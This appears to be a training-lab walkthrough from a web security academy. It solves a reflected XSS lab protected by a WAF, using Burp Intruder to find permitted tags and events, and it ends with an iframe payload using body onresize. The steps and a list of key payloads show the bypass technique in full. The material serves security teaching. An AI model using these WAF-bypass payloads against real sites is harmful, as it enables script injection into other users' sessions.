## Reflected XSS into HTML context with most tags and attributes blocked

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

### Solution Steps
1. Inject a standard XSS vector, such as: <img src=1 onerror=print()>
2. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
4. In Burp Intruder, replace the value of the search term with: <>
5. Place the cursor between the angle brackets and click Add § to create a payload position. The value of the search term should now look like: <§§>
6. Visit the XSS cheat sheet and click Copy
                        tags to clipboard .
7. In the Payloads side panel, under Payload configuration , click Paste to paste the list of tags into the payloads list. Click Start attack .
8. When the attack is finished, review the results. Note that most payloads caused a 400 response, but the body payload caused a 200 response.
9. Go back to Burp Intruder and replace your search term with: <body%20=1>
10. Place the cursor before the = character and click Add § to create a payload position. The value of the search term should now look like: <body%20§§=1>
11. Visit the XSS cheat sheet and click Copy events to clipboard .
12. In the Payloads side panel, under Payload configuration , click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click Start attack .
13. When the attack is finished, review the results. Note that most payloads caused a 400 response, but the onresize payload caused a 200 response.
14. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
15. Click Store and Deliver exploit to victim .

### Key Payloads
- `print()`
- `<img src=1 onerror=print()>`
- `<§§>`
- `body`
- `<body%20=1>`
- `<body%20§§=1>`
- `onresize`
- `YOUR-LAB-ID`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_reflected

---
*Source: PortSwigger Web Security Academy*
